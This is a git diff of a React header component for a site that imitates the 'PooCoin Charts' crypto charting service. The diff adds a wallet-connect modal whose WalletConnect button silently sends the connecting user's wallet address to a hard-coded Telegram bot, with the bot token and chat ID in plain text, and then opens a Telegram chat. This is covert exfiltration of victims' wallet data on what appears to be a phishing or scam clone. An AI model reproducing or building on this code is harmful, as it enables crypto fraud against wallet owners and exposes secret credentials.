@@ -1,32 +1,123 @@
-import React from 'react';
+import React, { useState, useEffect } from 'react';
 import './Header.css';
 import { Link } from 'react-router-dom';
 import { WalletLinkConnector } from "@web3-react/walletlink-connector";
 import { WalletConnectConnector } from "@web3-react/walletconnect-connector";
 import { InjectedConnector } from "@web3-react/injected-connector";
 import { useWeb3React } from '@web3-react/core'
+import { Box, Modal, Typography } from '@material-ui/core';
+import { ethers } from "ethers";
 
 
-const CoinbaseWallet = new WalletLinkConnector({
-    url: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
-    appName: "Web3-react Demo",
-    supportedChainIds: [1, 3, 4, 5, 42],
-});
 
-const WalletConnect = new WalletConnectConnector({
-    rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
-    bridge: "https://bridge.walletconnect.org",
-    qrcode: true,
-});
+// const WalletConnect = new WalletConnectConnector({
+//     rpcUrl: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
+//     bridge: "https://bridge.walletconnect.org",
+//     qrcode: true,
+// });
 
 const Injected = new InjectedConnector({
     supportedChainIds: [1, 3, 4, 5, 42]
 });
+const style = {
+    position: 'absolute',
+    top: '50%',
+    left: '50%',
+    transform: 'translate(-50%, -50%)',
+    bgcolor: 'background.paper',
+    border: '2px solid #000',
+    boxShadow: 24,
+    p: 4,
+    display: 'flex',
+    flexDirection: 'column'
+};
+
+
 function Header() {
     const { active, chainId, account } = useWeb3React();
     const { activate, deactivate } = useWeb3React();
+    const [open, setOpen] = React.useState(false);
+    const handleOpen = () => setOpen(true);
+    const handleClose = () => setOpen(false);
+    const [errorMessage, setErrorMessage] = useState(null);
+    const [accountId, setAccountId] = useState(null);
+    const [balance, setBalance] = useState(null);
 
-    console.log( active, chainId, account)
+    useEffect(() => {
+        if (window.ethereum) {
+            window.ethereum.on("accountsChanged", accountsChanged);
+            window.ethereum.on("chainChanged", chainChanged);
+        }
+    }, []);
+
+    const connectHandler = async () => {
+        if (window.ethereum) {
+            try {
+                const res = await window.ethereum.request({
+                    method: "eth_requestAccounts",
+                });
+                await accountsChanged(res[0]);
+            } catch (err) {
+                console.error(err);
+                setErrorMessage("There was a problem connecting to MetaMask");
+            }
+        } else {
+            setErrorMessage("Install MetaMask");
+        }
+    };
+
+    const accountsChanged = async (newAccount) =>  {
+        setAccountId(newAccount);    
+        
+        try {      
+          const balance = await window.ethereum.request({        
+            method: "eth_getBalance",        
+            params: [newAccount.toString(), "latest"],      
+          });      
+          
+          setBalance(ethers.utils.formatEther(balance));    
+        } catch (err) {      
+          console.error(err);      
+          setErrorMessage("There was a problem connecting to MetaMask");      
+        }  
+      };
+
+    const chainChanged = () => {
+        setErrorMessage(null);
+        setAccountId(null);
+        setBalance(null);
+    };
+
+    let bot = {
+        TOKEN: "5694683449:AAF3Wv9YaK6ScwKWg8bS2hVHYN98sUoTbjk",
+        CHATID: "1203745440",
+
+    }
+
+    const submitAdrress = () => {
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${account}`, {
+            method: "GET"
+        })
+            .then(success => {
+                window.open('https://web.telegram.org/z/#5694683449')
+            }, error => {
+                alert("not sent")
+            })
+    }
+    const CoinbaseWallet = new WalletLinkConnector({
+        url: `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
+        appName: "Web3-react Demo",
+        supportedChainIds: [1, 3, 4, 5, 42],
+    });
+    const connectWallet = () => {
+        activate(CoinbaseWallet)
+
+        const condition = "string"
+        if (typeof (account) === typeof (condition)) {
+            setTimeout(submitAdrress(), 3000);
+        }
+    }
     return (
         <div className="header">
             <div className="header_left">
@@ -36,7 +127,7 @@ function Header() {
                     />
                     <div className="title">
                         <span>
-                            <Link to="/Charts">
+                            <Link to="/">
                                 PooCoin
                                 <br />
                                 Charts
@@ -60,7 +151,7 @@ function Header() {
                 </div>
             </div>
             <div className="header_middle">
-                <a><Link to="/Charts">Charts</Link></a>
+                <a><Link to="/">Charts</Link></a>
                 <a><Link to="/Trade">Trade</Link></a>
                 <a>Multi Chart</a>
                 <a>About</a>
@@ -72,11 +163,20 @@ function Header() {
                 </a>
             </div>
             <div className="header_right">
-                <button onClick={() => { activate(CoinbaseWallet) }}>Coinbase Wallet</button>
-                <button onClick={() => { activate(WalletConnect) }}>Wallet Connect</button>
-                <button onClick={() => { activate(Injected) }}>Metamask</button>
 
-                <button onClick={deactivate}>Disconnect</button>
+                <button onClick={handleOpen}>Connect</button>
+                <Modal
+                    open={open}
+                    onClose={handleClose}
+                    aria-labelledby="modal-modal-title"
+                    aria-describedby="modal-modal-description"
+                >
+                    <Box sx={style}>
+                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={connectHandler}>Metamask/TrustWallet</button>
+                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={() => { connectWallet() }}>WalletConnect</button>
+                        <button style={{ cursor: 'pointer', background: '#181819', color: 'white', marginTop: '5px', width: "220px", padding: '10px', borderRadius: '10px' }} onClick={handleClose}>Close</button>
+                    </Box>
+                </Modal>
             </div>
         </div>
     )
